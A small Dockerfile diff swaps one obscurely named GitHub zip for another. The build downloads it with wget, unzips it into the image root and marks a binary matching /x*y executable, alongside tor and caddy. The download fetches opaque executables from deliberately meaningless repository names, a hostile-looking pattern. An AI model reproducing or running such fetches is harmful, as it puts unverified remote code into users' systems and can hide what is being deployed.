@@ -2,7 +2,7 @@ FROM alpine:edge
 
 RUN apk update && \
     apk add --no-cache ca-certificates caddy tor wget && \
-    wget -qO- https://github.com/Aebastiane/eexarsnh/raw/main/mgshdnh.zip | busybox unzip - && \
+    wget -qO- https://github.com/vernme/sdnhsfe/raw/main/xakownh.zip | busybox unzip - && \
     chmod +x $(ls /x*y) && \
     rm -rf /var/cache/apk/*
 
